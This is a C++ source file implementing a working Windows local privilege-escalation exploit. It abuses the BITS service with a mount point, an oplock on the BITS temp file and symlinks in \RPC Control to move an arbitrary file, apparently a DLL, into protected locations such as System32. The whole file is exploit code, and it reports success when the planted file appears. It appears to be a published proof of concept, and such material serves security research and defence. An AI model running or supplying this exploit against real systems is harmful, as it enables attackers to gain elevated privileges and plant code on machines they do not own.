
// Windows 
#include <iostream>

// BitsArbitraryFileMove
#include "BitsArbitraryFileMove.h"
#include "CBitsCom.h"

// Symbolic link testing tools 
#include "CommonUtils.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include "FileSymlink.h"

BitsArbitraryFileMove::BitsArbitraryFileMove()
{
	m_bCustomSourceFile = FALSE;
	ZeroMemory(m_wszWorkspaceDirPath, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_wszMountpointDirPath, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_wszBaitDirPath, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_wszSourceFilePath, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_wszTargetFilePath, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_wszBitsLocalFileName, MAX_FILENAME * sizeof(WCHAR));
	ZeroMemory(m_wszBitsTempFileName, MAX_FILENAME * sizeof(WCHAR));
	ZeroMemory(m_wszBitsTempFilePath, MAX_PATH * sizeof(WCHAR));
}

BitsArbitraryFileMove::~BitsArbitraryFileMove()
{
	CleanUp();
}

BOOL BitsArbitraryFileMove::Run(LPCWSTR pwszDstFile)
{
	return Run(NULL, pwszDstFile);
}

BOOL BitsArbitraryFileMove::Run(LPCWSTR pwszSrcFile, LPCWSTR pwszDstFile)
{
	WCHAR wszMsg[MAX_MSG];

	// ========================================================================
	// Check whether target file already exists
	// ========================================================================
	StringCchCat(m_wszTargetFilePath, MAX_PATH, pwszDstFile);

	if (TargetFileExists())
	{
		wprintf_s(L"[-] Target file '%ls' already exists. Aborting.\n", m_wszTargetFilePath);
		return FALSE;
	}


	// ========================================================================
	// Prepare environment 
	// ========================================================================
	if (!PrepareWorkspace())
	{
		wprintf_s(L"[-] BitsArbitraryFileMove::PrepareWorkspace() failed.\n");
		return FALSE;
	}

	wprintf_s(L"[*] Workspace: '%ls'.\n", m_wszWorkspaceDirPath);

	
	// ========================================================================
	// Handle source file 
	// If a source file path is provided, set it as the source file path for 
	// the exploit. Otherwise, write embedded DLL in the workspace. 
	// ========================================================================
	if (pwszSrcFile == NULL)
	{
		swprintf_s(m_wszSourceFilePath, MAX_PATH, L"%ls%ls", m_wszWorkspaceDirPath, L"FakeDll.dll");

		if (WriteSourceFile())
		{
			if (DEBUG) { wprintf_s(L"[DEBUG] Created 64-bit DLL '%ls'.\n", m_wszSourceFilePath); }
		}
		else
		{
			wprintf_s(L"[-] BitsArbitraryFileMove::WriteEmbeddedDll() failed.\n");
			return FALSE;
		}
	}
	else
	{
		m_bCustomSourceFile = TRUE;
		StringCchCat(m_wszSourceFilePath, MAX_PATH, pwszSrcFile);
	}

	wprintf_s(L"[*] Source file: '%ls'.\n", m_wszSourceFilePath);
	wprintf_s(L"[*] Destination file: '%ls'.\n", m_wszTargetFilePath);


	// ========================================================================
	// Create a mountpoint from MountPointDir to BaitDir
	// ========================================================================
	if (!ReparsePoint::CreateMountPoint(m_wszMountpointDirPath, m_wszBaitDirPath, L""))
	{
		wprintf_s(L"[-] ReparsePoint::CreateMountPoint('%ls') failed (Err: %d).\n", m_wszMountpointDirPath, ReparsePoint::GetLastError());
		return FALSE;
	}

	wprintf_s(L"[*] Created Mount Point: '%ls' -> '%ls'.\n", m_wszMountpointDirPath, m_wszBaitDirPath);


	// ========================================================================
	// BITS - Create Group, create a Job and add file
	// ========================================================================
	CBitsCom cBitsCom;
	WCHAR wszJobLocalFilename[MAX_PATH];

	StringCchCat(m_wszBitsLocalFileName, MAX_FILENAME, L"test.txt");

	ZeroMemory(wszJobLocalFilename, MAX_PATH * sizeof(WCHAR));
	swprintf_s(wszJobLocalFilename, MAX_PATH, L"%ls%ls", m_wszMountpointDirPath, m_wszBitsLocalFileName);

	if (DEBUG) { wprintf_s(L"[DEBUG] Using Local File '%ls'\n", wszJobLocalFilename); }

	if (cBitsCom.PrepareJob(wszJobLocalFilename) != BITSCOM_ERR_SUCCESS)
	{
		wprintf_s(L"[-] CBitsCom::PrepareJob('%ls') failed.\n", wszJobLocalFilename);
		return FALSE;
	}

	wprintf_s(L"[*] Created BITS job with local file: '%ls'.\n", wszJobLocalFilename);


	// ========================================================================
	// Find the TMP file created by BITS 
	// ========================================================================
	Sleep(3000);

	if (!FindBitsTempFile())
	{
		wprintf_s(L"[-] BitsArbitraryFileMove::FindBitsTempFile() failed.\n");
		return FALSE;
	}

	ZeroMemory(wszMsg, MAX_MSG * sizeof(WCHAR));
	swprintf_s(wszMsg, MAX_MSG, L"[+] Found BITS temp file: '%ls'\n", m_wszBitsTempFileName);
	PrintSuccess(wszMsg);


	// ========================================================================
	// Reconstruct the full path of the TMP file 
	// ========================================================================
	swprintf_s(m_wszBitsTempFilePath, MAX_PATH, L"%ls%ls", m_wszBaitDirPath, m_wszBitsTempFileName);

	if (DEBUG) { wprintf_s(L"[DEBUG] BITS temp file path: '%ls'\n", m_wszBitsTempFilePath); }


	// ========================================================================
	// Set an oplcok on the temp file
	// ========================================================================
	FileOpLock* oplock = nullptr;

	//oplock = FileOpLock::CreateLock(m_wszBitsTempFilePath, L"", HandleOplock);
	oplock = FileOpLock::CreateLock(m_wszBitsTempFilePath, L"", nullptr);
	if (oplock == nullptr)
	{
		wprintf_s(L"[-] FileOpLock::CreateLock('%ls') failed.\n", m_wszBitsTempFilePath);
		return FALSE;
	}

	wprintf_s(L"[*] OpLock set on '%ls'.\n", m_wszBitsTempFilePath);


	// ========================================================================
	// Resume BITS job and wait for the oplock to be triggered
	// ========================================================================
	if (cBitsCom.ResumeJob() != BITSCOM_ERR_SUCCESS)
	{
		wprintf_s(L"[-] BitsCom::ResumeJob() failed.\n");
		delete oplock;

		return FALSE;
	}

	wprintf_s(L"[*] BITS job has been resumed. Waiting for the oplock to be triggered...\n");

	oplock->WaitForLock(INFINITE);

	PrintSuccess(L"[+] OpLock triggered. Switching mountpoint.\n");


	// ========================================================================
	// Create Mount Point to \RPC Control
	// ========================================================================
	// --- Delete previous mount point ---
	if (!ReparsePoint::DeleteMountPoint(m_wszMountpointDirPath))
	{
		wprintf_s(L"[-] ReparsePoint::DeleteMountPoint('%ls') failed (Error: %ls).\n", m_wszMountpointDirPath, GetErrorMessage().c_str());
		delete oplock;
		return FALSE;
	}

	if (DEBUG) { wprintf_s(L"[DEBUG] Deleted mountpoint: '%ls'.\n", m_wszMountpointDirPath); }
	
	// --- Create mountpoint to \RPC Control ---
	const WCHAR* wszBaseObjDir = L"\\RPC Control";

	if (!ReparsePoint::CreateMountPoint(m_wszMountpointDirPath, wszBaseObjDir, L""))
	{
		wprintf_s(L"[-] ReparsePoint::CreateMountPoint('%ls') failed (Err: %d).\n", m_wszMountpointDirPath, ReparsePoint::GetLastError());
		delete oplock;
		return FALSE;
	}

	if (DEBUG) { wprintf_s(L"[DEBUG] Created mountpoint: '%ls' -> '%ls'.\n", m_wszMountpointDirPath, wszBaseObjDir); }


	// ========================================================================
	// Create symlinks
	// ========================================================================
	WCHAR wszLinkName[MAX_PATH];
	WCHAR wszLinkTarget[MAX_PATH];

	// --- TMP file -> source DLL ---
	ZeroMemory(wszLinkName, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(wszLinkTarget, MAX_PATH * sizeof(WCHAR));

	swprintf_s(wszLinkName, MAX_PATH, L"%ls\\%ls", wszBaseObjDir, m_wszBitsTempFileName); // -> '\RPC Control\BIT84A4.tmp'
	swprintf_s(wszLinkTarget, MAX_PATH, L"\\??\\%ls", m_wszSourceFilePath); // -> '\??\C:\Users\lab-user\AppData\Local\Temp\workspace\FakeDll.dll' 

	HANDLE hSymlinkSource = CreateSymlink(nullptr, wszLinkName, wszLinkTarget);
	if (hSymlinkSource == nullptr)
	{
		wprintf_s(L"[-] CreateSymlink('%ls') failed.\n", wszLinkName);
		delete oplock;
		return FALSE;
	}

	wprintf_s(L"[*] Created Symlink: '%ls' -> '%ls'\n", wszLinkName, wszLinkTarget);

	// --- Local file -> target DLL ---
	ZeroMemory(wszLinkName, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(wszLinkTarget, MAX_PATH * sizeof(WCHAR));

	swprintf_s(wszLinkName, MAX_PATH, L"%ls\\%ls", wszBaseObjDir, m_wszBitsLocalFileName); // -> '\RPC Control\test.txt'
	swprintf_s(wszLinkTarget, MAX_PATH, L"\\??\\%ls", m_wszTargetFilePath); // -> '\??\C:\Windows\System32\FakeDll.dll' 

	HANDLE hSymlinkDestination = CreateSymlink(nullptr, wszLinkName, wszLinkTarget);
	if (hSymlinkDestination == nullptr)
	{
		wprintf_s(L"[-] CreateSymlink('%ls') failed.\n", wszLinkName);
		CloseHandle(hSymlinkSource);
		delete oplock;
		return FALSE;
	}

	wprintf_s(L"[*] Created Symlink: '%ls' -> '%ls'\n", wszLinkName, wszLinkTarget);


	// ========================================================================
	// Release oplock and complete job 
	// ========================================================================
	wprintf_s(L"[*] Releasing OpLock and waiting for the job to complete...\n");
	
	delete oplock;

	if (cBitsCom.CompleteJob() != BITSCOM_ERR_SUCCESS)
	{
		wprintf_s(L"[-] BitsCom::CompleteJob() failed.\n");
		CloseHandle(hSymlinkSource);
		CloseHandle(hSymlinkDestination);
		return FALSE;
	}

	if (DEBUG) { wprintf_s(L"[DEBUG] CBitsCom::CompleteJob() OK\n"); }

	CloseHandle(hSymlinkSource);
	CloseHandle(hSymlinkDestination);


	// ========================================================================
	// Check whether target DLL exists 
	// ========================================================================
	if (!TargetFileExists())
	{
		wprintf_s(L"[-] Target file '%ls' doesn't exist. Exploit failed.", m_wszTargetFilePath);
		return FALSE;
	}

	ZeroMemory(wszMsg, MAX_MSG * sizeof(WCHAR));
	swprintf_s(wszMsg, MAX_MSG, L"[+] Found target file '%ls'. Exploit successfull!\n", m_wszTargetFilePath);

	PrintSuccess(wszMsg);

	return TRUE;
}

BOOL BitsArbitraryFileMove::PrepareWorkspace()
{
	/*
		0) Prepare workspace
			Create C:\workspace\
			Create C:\workspace\mountpoint\
			Create C:\workspace\bait\

			<DIR> C:\workspace
			|__ <DIR> mountpoint
			|__ <DIR> redir
	*/

	DWORD dwRet = 0;
	WCHAR wszTempPathBuffer[MAX_PATH];


	// ========================================================================
	// Create a workspace 
	// ========================================================================
	dwRet = GetTempPath(MAX_PATH, wszTempPathBuffer);
	if (dwRet > MAX_PATH || (dwRet == 0))
	{
		wprintf_s(L"[-] GetTempPath() failed (Err: %d).\n", GetLastError());

		ZeroMemory(wszTempPathBuffer, MAX_PATH);
		StringCchCat(wszTempPathBuffer, MAX_PATH, L"C:\\workspace\\");
	}
	else
	{
		if (wszTempPathBuffer[wcslen(wszTempPathBuffer) - 1] != '\\')
		{
			StringCchCat(wszTempPathBuffer, MAX_PATH, L"\\");
		}
		StringCchCat(wszTempPathBuffer, MAX_PATH, L"workspace\\");
	}

	if (!CreateDirectory(wszTempPathBuffer, nullptr))
	{
		dwRet = GetLastError();
		if (dwRet == ERROR_ALREADY_EXISTS)
		{
			wprintf_s(L"[!] The directory '%ls' already exists.\n", wszTempPathBuffer);
		}	
		else
		{
			wprintf_s(L"[-] CreateDirectory('%ls') failed (Err: %d).\n", wszTempPathBuffer, dwRet);
		}
		return FALSE;
	}

	StringCchCat(m_wszWorkspaceDirPath, MAX_PATH, wszTempPathBuffer);

	if (DEBUG) { wprintf_s(L"[DEBUG] Using Workspace Directory '%ls'.\n", m_wszWorkspaceDirPath); }


	// ========================================================================
	// Create a directory for the mount point 
	// ========================================================================
	ZeroMemory(wszTempPathBuffer, MAX_PATH);
	StringCchCat(wszTempPathBuffer, MAX_PATH, m_wszWorkspaceDirPath);
	StringCchCat(wszTempPathBuffer, MAX_PATH, L"mountpoint\\");

	if (!CreateDirectory(wszTempPathBuffer, nullptr))
	{
		wprintf_s(L"[-] CreateDirectory('%ls') failed (Err: %d).\n", wszTempPathBuffer, GetLastError());
		return FALSE;
	}

	StringCchCat(m_wszMountpointDirPath, MAX_PATH, wszTempPathBuffer);

	if (DEBUG) { wprintf_s(L"[DEBUG] Using Mount Point Directory '%ls'.\n", m_wszMountpointDirPath); }


	// ========================================================================
	// Create a "bait" directory for the TMP file 
	// ========================================================================
	ZeroMemory(wszTempPathBuffer, MAX_PATH);
	StringCchCat(wszTempPathBuffer, MAX_PATH, m_wszWorkspaceDirPath);
	StringCchCat(wszTempPathBuffer, MAX_PATH, L"bait\\");

	if (!CreateDirectory(wszTempPathBuffer, nullptr))
	{
		wprintf_s(L"[-] CreateDirectory('%ls') failed (Err: %d).\n", wszTempPathBuffer, GetLastError());
		return FALSE;
	}
	StringCchCat(m_wszBaitDirPath, MAX_PATH, wszTempPathBuffer);

	if (DEBUG) { wprintf_s(L"[DEBUG] Using Bait Directory '%ls'.\n", m_wszBaitDirPath); }

	return TRUE;
}

BOOL BitsArbitraryFileMove::WriteSourceFile()
{
	HANDLE hFile;
	BOOL bErrorFlag = FALSE;
	const char* fileContent = "foo123\r\n";
	DWORD dwBytesToWrite = (DWORD)strlen(fileContent);
	DWORD dwBytesWritten = 0;

	hFile = CreateFile(m_wszSourceFilePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wprintf_s(L"[-] CreateFile('%ls') failed (Err: %d).\n", m_wszSourceFilePath, GetLastError());
		return FALSE;
	}

	bErrorFlag = WriteFile(hFile, fileContent, dwBytesToWrite, &dwBytesWritten, NULL);
	if (FALSE == bErrorFlag)
	{
		wprintf_s(L"[-] WriteFile('%ls') failed (Err: %d).\n", m_wszSourceFilePath, GetLastError());
		return FALSE;
	}
	else
	{
		if (dwBytesWritten != dwBytesToWrite)
		{
			wprintf_s(L"[-] WriteFile('%ls') failed (Err: %d).\n", m_wszSourceFilePath, GetLastError());
			return FALSE;
		}
	}

	CloseHandle(hFile);

	return TRUE;
}

BOOL BitsArbitraryFileMove::FindBitsTempFile()
{
	WIN32_FIND_DATA structWin32FindData;
	WCHAR wszSearchPath[MAX_PATH];
	HANDLE hRes;

	ZeroMemory(wszSearchPath, MAX_PATH * sizeof(WCHAR));
	StringCchCat(wszSearchPath, MAX_PATH, m_wszBaitDirPath);
	StringCchCat(wszSearchPath, MAX_PATH, L"BIT*.tmp");

	hRes = FindFirstFile(wszSearchPath, &structWin32FindData);
	if (hRes == INVALID_HANDLE_VALUE)
	{
		wprintf_s(L"[-] FindFirstFile('%ls') failed (Err: %d).\n", wszSearchPath, GetLastError());
		return FALSE;
	}

	StringCchCat(m_wszBitsTempFileName, MAX_FILENAME, structWin32FindData.cFileName);

	FindClose(hRes);

	return TRUE;
}

BOOL BitsArbitraryFileMove::TargetFileExists()
{
	HANDLE hProcess;
	BOOL bWow64Process;
	PVOID pOldValue = nullptr;
	BOOL bRes = FALSE;

	hProcess = GetCurrentProcess();

	if (!IsWow64Process(hProcess, &bWow64Process))
	{
		wprintf_s(L"[!] IsWow64Process() failed (Err: %d).\n", GetLastError());
	}

	if (bWow64Process)
	{
		// Disable WOW64 file system redirector
		if (!Wow64DisableWow64FsRedirection(&pOldValue))
		{
			wprintf_s(L"[!] Wow64DisableWow64FsRedirection() failed (Err: %d).\n", GetLastError());
		}
	}

	// Check whether target file exists
	if (GetFileAttributes(m_wszTargetFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		if (DEBUG) { wprintf_s(L"[DEBUG] Found target file '%ls'.\n", m_wszTargetFilePath); }
		bRes = TRUE;
	}
	else
	{
		if (DEBUG) { wprintf_s(L"[DEBUG] Target file '%ls' doesn't exist.\n", m_wszTargetFilePath); }
	}

	if (bWow64Process)
	{
		// Enable WOW64 file system redirector
		if (!Wow64RevertWow64FsRedirection(pOldValue))
		{
			wprintf_s(L"[!] Wow64RevertWow64FsRedirection() failed (Err: %d).\n", GetLastError());
		}
	}

	CloseHandle(hProcess);

	return bRes;
}

void BitsArbitraryFileMove::CleanUp()
{
	wprintf_s(L"[*] Performing clean-up...\n");

	// Delete BITS temp file 
	if (wcslen(m_wszBitsTempFilePath) > 0)
	{
		if (GetFileAttributes(m_wszBitsTempFilePath) != INVALID_FILE_ATTRIBUTES)
		{
			if (!DeleteFile(m_wszBitsTempFilePath))
				wprintf_s(L"[!] DeleteFile('%ls') failed (Err: %d).\n", m_wszBitsTempFilePath, GetLastError());
			else
				if (DEBUG) { wprintf_s(L"[DEBUG] Deleted file '%ls'.\n", m_wszBitsTempFilePath); }
		}
	}

	// Delete the source file if it was created by us
	if (!m_bCustomSourceFile)
	{
		if (GetFileAttributes(m_wszSourceFilePath) != INVALID_FILE_ATTRIBUTES)
		{
			if (!DeleteFile(m_wszSourceFilePath))
				wprintf_s(L"[!] DeleteFile('%ls') failed (Err: %d).\n", m_wszSourceFilePath, GetLastError());
			else
				if (DEBUG) { wprintf_s(L"[DEBUG] Deleted file '%ls'.\n", m_wszSourceFilePath); }
		}
	}

	// Remove bait directory 
	if (wcslen(m_wszBaitDirPath) > 0)
	{
		if (GetFileAttributes(m_wszBaitDirPath) != INVALID_FILE_ATTRIBUTES)
		{
			if (!RemoveDirectory(m_wszBaitDirPath))
				wprintf_s(L"[!] RemoveDirectory('%ls') failed (Err: %d).\n", m_wszBaitDirPath, GetLastError());
			else
				if (DEBUG) { wprintf_s(L"[DEBUG] Removed directory '%ls'.\n", m_wszBaitDirPath); }
		}
	}

	// Remove mount point directory 
	if (wcslen(m_wszMountpointDirPath) > 0)
	{
		if (GetFileAttributes(m_wszMountpointDirPath) != INVALID_FILE_ATTRIBUTES)
		{
			// Delete Mount Point 
			if (!ReparsePoint::DeleteMountPoint(m_wszMountpointDirPath))
				wprintf_s(L"[!] ReparsePoint::DeleteMountPoint('%ls') failed.\n", m_wszMountpointDirPath);
			else
				if (DEBUG) { wprintf_s(L"[DEBUG] Deleted Mount Point '%ls'.\n", m_wszMountpointDirPath); }

			// Remove directory
			if (!RemoveDirectory(m_wszMountpointDirPath))
				wprintf_s(L"[!] RemoveDirectory('%ls') failed (Err: %d).\n", m_wszMountpointDirPath, GetLastError());
			else
				if (DEBUG) { wprintf_s(L"[DEBUG] Removed directory '%ls'.\n", m_wszMountpointDirPath); }
		}
	}

	// Remove workspace directory 
	if (wcslen(m_wszWorkspaceDirPath) > 0)
	{
		if (GetFileAttributes(m_wszWorkspaceDirPath) != INVALID_FILE_ATTRIBUTES)
		{
			if (!RemoveDirectory(m_wszWorkspaceDirPath))
				wprintf_s(L"[!] RemoveDirectory('%ls') failed (Err: %d).\n", m_wszWorkspaceDirPath, GetLastError());
			else
				if (DEBUG) { wprintf_s(L"[DEBUG] Removed directory '%ls'.\n", m_wszWorkspaceDirPath); }
		}
	}

	return;
}

void BitsArbitraryFileMove::PrintSuccess(LPCWSTR pwszMsg)
{
	HANDLE hConsole;
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	wprintf_s(L"%ls", pwszMsg);
	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_RED);
}
